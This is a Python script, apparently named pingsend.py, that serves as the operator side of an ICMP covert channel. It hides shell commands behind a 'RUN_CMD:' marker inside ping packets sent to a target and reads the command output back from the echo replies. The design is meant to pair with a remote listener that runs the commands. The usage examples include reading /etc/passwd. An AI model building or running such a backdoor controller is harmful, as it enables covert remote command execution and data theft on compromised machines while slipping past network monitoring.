#!/usr/bin/env python3
import socket
import struct
import sys
import select
import time

# Configuration
SIGNATURE = b"RUN_CMD:"
ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY = 0
MAX_PACKET_SIZE = 65535
TIMEOUT = 20  # Match listener timeout + buffer

def calc_icmp_checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i+1]
        s += w
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return ~s & 0xffff

def send_command(target_ip, command):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.settimeout(TIMEOUT)
    except PermissionError:
        print("[!] Error: Run as root/admin to use raw sockets.")
        print("[!] Try: sudo python3 pingsend.py <target> <command>")
        return
    except Exception as e:
        print(f"[!] Socket creation error: {e}")
        return
    
    # Prepare Payload
    payload = SIGNATURE + command.encode()
    
    # Build ICMP Header
    icmp_id = 1234  # Arbitrary ID
    icmp_seq = 1    # Arbitrary sequence
    header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, 0, icmp_id, icmp_seq)
    
    # Calculate Checksum
    chksum = calc_icmp_checksum(header + payload)
    header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, chksum, icmp_id, icmp_seq)
    
    # Send it
    packet = header + payload
    print(f"[*] Target: {target_ip}")
    print(f"[*] Command: {command}")
    print(f"[*] Payload size: {len(payload)} bytes")
    print(f"[*] Sending command...")
    
    try:
        sock.sendto(packet, (target_ip, 0))
        send_time = time.time()
        print(f"[*] Packet sent, waiting for response (timeout: {TIMEOUT}s)...")
    except Exception as e:
        print(f"[!] Send error: {e}")
        sock.close()
        return
    
    # Wait for response (Echo Reply)
    try:
        while True:
            ready = select.select([sock], [], [], TIMEOUT)
            
            if not ready[0]:
                print(f"[!] Timeout: No response received after {TIMEOUT} seconds.")
                break
            
            packet, addr = sock.recvfrom(MAX_PACKET_SIZE)
            
            # Skip IP Header
            ip_header_len = (packet[0] & 0x0F) * 4
            icmp_header = packet[ip_header_len : ip_header_len + 8]
            
            # Unpack ICMP header
            icmp_type, code, cksum, resp_id, resp_seq = struct.unpack("!BBHHH", icmp_header)
            
            # Check if this is our reply
            if icmp_type == ICMP_ECHO_REPLY and resp_id == icmp_id and resp_seq == icmp_seq:
                response_payload = packet[ip_header_len + 8:]
                elapsed = time.time() - send_time
                
                print(f"\n[*] Response received from {addr[0]} in {elapsed:.2f}s")
                print(f"[*] Response size: {len(response_payload)} bytes")
                print("\n" + "="*60)
                print("COMMAND OUTPUT:")
                print("="*60)
                print(response_payload.decode(errors='ignore'))
                print("="*60)
                break
            else:
                # Not our packet, keep waiting
                continue
                
    except socket.timeout:
        print(f"[!] Timeout: No response received after {TIMEOUT} seconds.")
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    except Exception as e:
        print(f"[!] Error receiving response: {e}")
    finally:
        sock.close()

def main():
    if len(sys.argv) < 3:
        print("Usage: sudo python3 pingsend.py <target_ip> <command>")
        print("\nExamples:")
        print("  sudo python3 pingsend.py 192.168.1.100 whoami")
        print("  sudo python3 pingsend.py 192.168.1.100 \"ls -la\"")
        print("  sudo python3 pingsend.py 192.168.1.100 \"ping -c 3 8.8.8.8\"")
        print("  sudo python3 pingsend.py 192.168.1.100 \"cat /etc/passwd\"")
        sys.exit(1)
    
    target = sys.argv[1]
    
    # Join all arguments after target IP to form complete command
    # This fixes: pingsend.py 1.2.3.4 ping 8.8.8.8
    # Now "ping 8.8.8.8" instead of just "ping"
    cmd = ' '.join(sys.argv[2:])
    
    if not cmd.strip():
        print("[!] Error: Command cannot be empty.")
        sys.exit(1)
    
    send_command(target, cmd)

if __name__ == "__main__":
    main()
